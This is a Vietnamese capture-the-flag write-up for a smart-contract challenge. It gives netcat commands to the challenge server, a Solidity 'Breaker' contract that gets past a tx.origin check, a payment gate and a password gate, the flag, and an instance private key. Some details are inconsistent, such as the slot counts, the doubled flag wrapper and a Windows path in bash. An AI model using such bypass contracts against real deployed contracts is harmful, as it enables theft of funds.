# Gateway — Web3 (199 points)

**Flag:** `CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}`
**File đính kèm:** `Gate.sol`, `Setup.sol`

## Đề bài

Hệ thống Gateway thiết lập hệ thống bảo vệ ba lớp bên trong hợp đồng thông minh (contract) UPDC, hoạt động trên hạ tầng mạng Quantum Nexus Network. Yêu cầu để hoàn tất thử thách bao gồm ba điều kiện: (1) Thực hiện lời gọi khởi nguồn từ một hợp đồng thông minh khác (`tx.origin != msg.sender`), (2) chuyển giao tài sản (ether) thông qua hàm mặc định `receive()`, và (3) đệ trình một giá trị mật khẩu (password) chính xác. Giao thức tương tác (Instance) được cấp tại địa chỉ `nc 34.116.80.78:31337`.

## Phân tích ban đầu

- Hợp đồng `Gate` sở hữu cấu trúc trạng thái nội bộ với 4 phân vùng lưu trữ (slots state), bao gồm các biến trạng thái: `stepped`, `funded`, và `solved`. Giá trị băm của mật khẩu (password hash) được lưu tại vị trí khe nhớ (slot) 1.
- Thuật toán mật khẩu được thiết lập từ biểu thức hàm băm `keccak256("gateway to the flag")`. Điều này có thể được xác thực thông qua phương thức truy vấn trạng thái hợp đồng `eth_getStorageAt`.
- Hệ thống máy chủ điều khiển thông qua giao thức netcat (nc) được cấu hình theo mô hình tạo đối tượng (instance factory) tương tự như chuẩn ethernaut: mỗi hành động tùy chọn (`1 launch / 2 kill / 3 get flag`) sẽ yêu cầu mở một kết nối TCP riêng biệt.
- Sau khi chu trình hủy lệnh (`kill`) và tái khởi tạo (`relaunch`) kết thúc, hệ thống cấp phát các dữ liệu chứng thực (credentials) bao gồm: mã định danh uuid, điểm cuối mạng lưới RPC, khóa cá nhân (private key) và địa chỉ của hợp đồng Setup.
- Điểm cuối RPC proxy được đồng bộ (fork) trực tiếp từ mạng chính mainnet (có chainId là 1, ở vị trí khối block xấp xỉ 26 triệu). Tài khoản của người tham gia thử thách được tài trợ số dư ban đầu 5000 ETH.

## Chuỗi khai thác

**Bước 1 — Phân tích môi trường mạng và truy xuất bộ thông số chứng thực (Credentials).**

```bash
echo -e "3\nR3:TURИ" | nc 34.116.80.78 31337
# Phản hồi hệ thống: "are you sure you solved it?" → Xác nhận hệ thống ở trạng thái nguyên sơ, chưa ghi nhận giải pháp.

# Hủy phiên bản (instance) cũ nếu đang tồn tại
echo -e "2\nR3:TURИ" | nc 34.116.80.78 31337
# Phản hồi hệ thống: "Instance killed"

# Khởi tạo instance mới để nhận dữ liệu chứng thực
echo -e "1\nR3:TURИ" | nc 34.116.80.78 31337
# Dữ liệu xuất ra:
#   uuid:           47c4a887-8b71-4b92-aa4d-eea88f7669f2
#   rpc endpoint:   http://34.116.80.78:8545/47c4a887-8b71-4b92-aa4d-eea88f7669f2
#   private key:    0xd5c7492813f0829fc5534896e58179c3b618c6227b9c5df38f5d2b1aba6ba206
#   setup contract: 0x1ACF30FAB13942fBf5581E8fbDb72D01e2Ad5D3b
```

**Bước 2 — Xác thực giá trị băm mật khẩu từ khe nhớ trạng thái (Storage slot).**

```python
>>> from web3 import Web3
>>> Web3.keccak(text='gateway to the flag').hex()
'90cd83d75da724f03cbd4c1bd73dbfca4325ab5c4930082484b6f6aa9234d70b'
>>> # Phép tính: eth_getStorageAt(gate, 1) => 0x90cd83d7...9234d70b === TRÙNG KHỚP
```

**Bước 3 — Triển khai Hợp đồng Phá vỡ bảo vệ (Breaker contract).**

Hợp đồng Breaker được xây dựng với mục tiêu vượt qua hệ thống kiểm duyệt cơ bản `tx.origin != msg.sender`:

```solidity
contract Breaker {
    IGate public gate;
    bytes32 public secret;
    
    constructor(IGate _gate, bytes32 _secret) payable {
        gate = _gate; secret = _secret;
    }
    
    function run() external {
        gate.enter();                                    // Vượt cửa 1 (Door 1)
        (bool ok, ) = address(gate).call{value: 1 ether}("");  // Vượt cửa 2 (Door 2) thông qua chuyển khoản
        require(ok, "door2");
        gate.claim(secret);                              // Vượt cửa 3 (Door 3) thông qua truyền khóa xác thực
    }
    
    receive() external payable {}
}
```

Thực hiện lệnh triển khai (Deploy) với giá trị 3 ETH, truyền các tham số khởi tạo (constructor args) là `(GATE_ADDR, password_hash)`.

**Bước 4 — Kích hoạt hàm thực thi run() và tiến hành xác thực dữ liệu.**

```json
{
  "deploy": "Trạng thái 0x1, hợp đồng thiết lập 0xFc5ac01775cF736D929572EC7478ed6930703506",
  "run": "Trạng thái 0x1, tiêu thụ gas 0xf362",
  "isSolved": "0x0000000000000000000000000000000000000000000000000000000000000001"
}
```

Kiểm tra phân vùng nhớ trạng thái (Gate slots) 2, 3, và 4, kết quả chỉ thị `0x010101` (xác nhận ba cờ logic `stepped`, `funded`, và `solved` đều thiết lập trạng thái true).

**Bước 5 — Truy xuất cờ dữ liệu (Flag).**

```bash
echo -e "3\nR3:TURИ" | nc 34.116.80.78 31337
# Phản hồi hệ thống: CSS{B451C_BL0CKCH41N_5K1LL5}
```

Định dạng cờ đầy đủ: `CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}`.

## Flag

Kết quả:
```text
CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}
```

## Reproduce

Quá trình tự động tái thiết lập bằng công cụ (script):

```bash
export CSS_RPC=http://34.116.80.78:8545/47c4a887-8b71-4b92-aa4d-eea88f7669f2
export CSS_PK=d5c7492813f0829fc5534896e58179c3b618c6227b9c5df38f5d2b1aba6ba206

cd %TEMP%\css_gate
python exploit.py files/Gate.sol
# Đầu ra mong đợi: ✓ FLAG CHAINED!
```
